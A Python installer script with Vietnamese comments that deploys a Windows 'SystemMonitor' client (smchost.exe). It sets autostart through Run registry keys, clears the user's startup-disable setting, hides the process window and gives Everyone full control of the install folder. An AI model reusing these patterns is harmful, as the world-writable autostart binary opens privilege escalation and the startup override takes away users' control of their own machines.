import os
import sys
import shutil
import subprocess
import winreg
import platform
import time
import zipfile

def install():
    target_dir = r"C:\Users\Public\SystemMonitor"
    exe_name = "smchost.exe"
    config_name = "config.ini"
    flags = getattr(subprocess, 'CREATE_NO_WINDOW', 0)
    detached_flags = getattr(subprocess, 'CREATE_NO_WINDOW', 0) | getattr(subprocess, 'DETACHED_PROCESS', 0x00000008)
    
    # 1. Xác định thư mục chứa dữ liệu nguồn
    if getattr(sys, 'frozen', False):
        base_path = sys._MEIPASS
    else:
        base_path = os.path.dirname(os.path.abspath(__file__))
        
    src_exe = os.path.join(base_path, exe_name)
    if not os.path.exists(src_exe):
        for alt in [
            os.path.join(base_path, "..", "source", "client", exe_name),
            os.path.join(base_path, "..", "dist", exe_name),
            os.path.join(base_path, "..", exe_name)
        ]:
            if os.path.exists(alt):
                src_exe = alt
                break

    src_config = os.path.join(base_path, config_name)
    if not os.path.exists(src_config):
        for alt in [
            os.path.join(base_path, "..", config_name),
            os.path.join(base_path, "..", "source", "client", config_name),
            os.path.join(base_path, "..", "config.ini")
        ]:
            if os.path.exists(alt):
                src_config = alt
                break

    dest_exe = os.path.join(target_dir, exe_name)
    dest_config = os.path.join(target_dir, config_name)
    
    # 2. Tắt triệt để tiến trình cũ (nếu có) để giải phóng khóa tệp tin
    for _ in range(3):
        subprocess.run(["taskkill", "/f", "/im", exe_name], capture_output=True, creationflags=flags)
        time.sleep(0.5)
    
    # 3. Tạo thư mục đích nếu chưa có
    if not os.path.exists(target_dir):
        try:
            os.makedirs(target_dir, exist_ok=True)
        except Exception:
            pass

    # Xóa file thực thi cũ (hoặc đổi tên nếu Windows đang giữ handle)
    if os.path.exists(dest_exe):
        removed = False
        for _ in range(5):
            try:
                os.remove(dest_exe)
                removed = True
                break
            except Exception:
                subprocess.run(["taskkill", "/f", "/im", exe_name], capture_output=True, creationflags=flags)
                time.sleep(0.5)
        if not removed and os.path.exists(dest_exe):
            try:
                old_dest = dest_exe + f".old_{int(time.time())}"
                if os.path.exists(old_dest):
                    os.remove(old_dest)
                os.rename(dest_exe, old_dest)
            except Exception:
                pass

    # Giải nén gói zip client (nếu có trong gói cài đặt)
    for zip_name in ["data.zip", "client.zip", "smchost.zip"]:
        zip_file = os.path.join(base_path, zip_name)
        if os.path.exists(zip_file):
            try:
                with zipfile.ZipFile(zip_file, 'r') as zf:
                    zf.extractall(target_dir)
                break
            except Exception:
                pass

    # Sao chép file thực thi client mới (smchost.exe) vào thư mục đích
    if os.path.exists(src_exe):
        for _ in range(5):
            try:
                shutil.copy2(src_exe, dest_exe)
                break
            except Exception:
                time.sleep(0.5)

    # Cập nhật file cấu hình config.ini
    if os.path.exists(src_config):
        try:
            if not os.path.exists(dest_config):
                shutil.copy2(src_config, dest_config)
            else:
                # Đã có file cấu hình tại client: Sao lưu và cập nhật
                shutil.copy2(src_config, dest_config)
        except Exception:
            pass

    # Xóa các file source/tệp nén dư thừa sau khi cài đặt để tối ưu dung lượng
    for extra_file in ["data.zip", "client.zip", "smchost.zip", "client_setup.exe", "updater.bat"]:
        extra_path = os.path.join(target_dir, extra_file)
        if os.path.exists(extra_path):
            try:
                os.remove(extra_path)
            except Exception:
                pass

    # Dọn dẹp các file rác .old nếu có
    try:
        for f in os.listdir(target_dir):
            if f.startswith("smchost.exe.old"):
                try:
                    os.remove(os.path.join(target_dir, f))
                except Exception:
                    pass
    except Exception:
        pass

    # Dọn dẹp các file source trong thư mục updates (nếu tồn tại trên máy)
    current_script_dir = os.path.dirname(os.path.abspath(__file__))
    potential_updates_dirs = [
        os.path.join(base_path, "static", "updates"),
        os.path.join(base_path, "updates"),
        os.path.join(current_script_dir, "..", "static", "updates"),
        os.path.join(current_script_dir, "..", "source", "server", "static", "updates"),
        os.path.join(target_dir, "updates")
    ]
    for upd_dir in potential_updates_dirs:
        if os.path.isdir(upd_dir):
            for file_to_clean in ["smchost.exe", "config.ini", "updater.bat"]:
                f_path = os.path.join(upd_dir, file_to_clean)
                if os.path.exists(f_path):
                    try:
                        os.remove(f_path)
                    except Exception:
                        pass
            
    # 4. Phân quyền thư mục cho tất cả Users truy cập
    try:
        subprocess.run(["icacls", target_dir, "/grant", "Users:(OI)(CI)F", "/T"], capture_output=True, creationflags=flags)
        subprocess.run(["icacls", target_dir, "/grant", "Everyone:(OI)(CI)F", "/T"], capture_output=True, creationflags=flags)
    except Exception:
        pass
        
    # 5. Thiết lập Registry Run (Khởi động cùng hệ thống)
    reg_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
    approved_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run"
    app_name = "smchost"
    app_path = f'"{dest_exe}" -minimized'
    
    # Thử HKLM (All Users)
    hklm_success = False
    try:
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, reg_path, 0, winreg.KEY_ALL_ACCESS)
        try:
            winreg.DeleteValue(key, app_name)
        except FileNotFoundError:
            pass
        winreg.SetValueEx(key, app_name, 0, winreg.REG_SZ, app_path)
        winreg.CloseKey(key)
        
        try:
            approved_key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, approved_path, 0, winreg.KEY_ALL_ACCESS)
            winreg.DeleteValue(approved_key, app_name)
            winreg.CloseKey(approved_key)
        except Exception:
            pass
        hklm_success = True
    except Exception:
        pass
        
    # Nếu không có quyền Admin, fallback sang HKCU (Current User)
    if not hklm_success:
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_ALL_ACCESS)
            try:
                winreg.DeleteValue(key, app_name)
            except FileNotFoundError:
                pass
            winreg.SetValueEx(key, app_name, 0, winreg.REG_SZ, app_path)
            winreg.CloseKey(key)
            
            try:
                approved_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, approved_path, 0, winreg.KEY_ALL_ACCESS)
                winreg.DeleteValue(approved_key, app_name)
                winreg.CloseKey(approved_key)
            except Exception:
                pass
        except Exception:
            pass
            
    # 6. Khởi động Client chạy ngầm hoàn toàn độc lập (DETACHED_PROCESS)
    try:
        if os.path.exists(dest_exe):
            subprocess.Popen([dest_exe, "-minimized"], creationflags=detached_flags, close_fds=True)
    except Exception:
        pass

if __name__ == "__main__":
    if platform.system() == "Windows":
        install()
